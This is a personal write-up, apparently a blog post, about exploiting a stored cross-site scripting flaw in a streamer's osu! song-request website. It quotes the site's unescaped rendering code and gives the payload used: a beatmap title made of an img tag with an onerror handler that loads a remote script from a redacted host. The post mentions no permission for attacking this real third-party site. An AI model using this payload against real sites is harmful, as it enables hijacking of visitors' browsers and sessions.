title: How I hacked a YouTubers website
---
### Introduction
I hacked the website of the largest osu! game content creator. Osu (stylized "osu!") is a rhythm game with a simple premise; click the circles which appear to the beat of the song. There is thousands of different songs in the game, also known as a "beatmaps". Among the notable figures in this community is BTMC, a prominent YouTuber and Twitch streamer known for his osu! related content such as the following:

Glarses" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

It is common to see viewers recommending beatmaps for a streamer to play live. To handle the large amount of song requests, he has a website which you can request specific songs from osu! to be played by him. Here is what this user interface looks like.

### Analyzing The Request Bot
My first thought was to check the client-side of the website as this is not an open-source project. I was particularly curious in how the the song name / title / artist of a beatmap is displayed to the client. The code which displays a given request to the DOM is the following:
{% highlight javascript %}
function generateHistotyNode(data){
	let request_top = '<div data-bmr-id="'+data.bmr_id+'" class="request-node left-align" style="background-size: cover; background-image: -webkit-linear-gradient(left, rgba(41,40,40,1.0) 0%,rgba(41,40,40,1.0) 25%, rgba(41,40,40,0.85) 40%, rgba(41,40,40,0.5) 100% ), url(https://assets.ppy.sh/beatmaps/'+data.bmr_set_id+'/covers/cover.jpg);">'
	let request_bottom = '</div>'
	let request_time = '<span class="time">'+moment(data.bmr_timestamp).local().format('hh:mm a')+': </span>'
	let request_text = '<a target="_blank" href="https://osu.ppy.sh/b/'+data.bmr_map_id+'" style="color: inherit;"><span class="text">'+data.bmr_msg+'</span></a>'
	let request = request_top + request_time + request_text + request_bottom;
	return request;
}

// .. later in code ... //

let request = generateHistotyNode(data[i])
$('.requests-list').append($(request).hide().fadeIn(300));
{% endhighlight %}

It appears to be taking the metadata from a submitted beatmap and creating an HTML element to be displayed to DOM. Though reviewing this indicated some red-flags to me:
1. There does not appear to be any filtering on the beatmap metadata displayed to DOM.
2. If I can control to beatmap metadata, then I can inject my own HTML code into the website.

### Crafting The Payload
Beatmap files in osu! are just plain text files which contain metadata, positions, and timing of the circles which appear on the screen. Here is an example osu! beatmap which contains 3 notes and metadata of the song file.

{% highlight plain %}

{% endhighlight %}

Based on the findings earlier, I decided to create my own beatmap with the following metadata and publish it to osu!. I'm setting the title to be a `<img>` tag with the src pointing towards a non-existing image path. Once this request fails, it will use jQuery to fetch my payload script from a webserver. I'm using image tags as scripts do not automatically execute when written to DOM by jQuery.  
{% highlight plain %}
[Metadata]
Title:<img src=x onerror="$.getScript('https://REDACTED.com/btmc.js')">

{% endhighlight %}

This is how the beatmap is displayed on the official osu! website, the img tag was properly parsed and URL encoded. Though an important note is that when fetching the beatmap using their official API, you get a response like this:
{% highlight javascript %}
{
	/* ... other metadata here */
	"title":"<img src=x onerror=\"$.getScript('https:\/\/REDACTED.com\/btmc.js')\">",
	"title_unicode":"<img src=x onerror=\"$.getScript('https:\/\/REDACTED.com\/btmc.js')\">"
	/* ... other metadata here */
}
{% endhighlight %}

Notice how the API returns the metadata of the beatmap in its original form without encoding any of the values. Finally, I just needed to submit a request with the beatmap ID to his website.

You can see how the rest of this played out on this YouTube video.
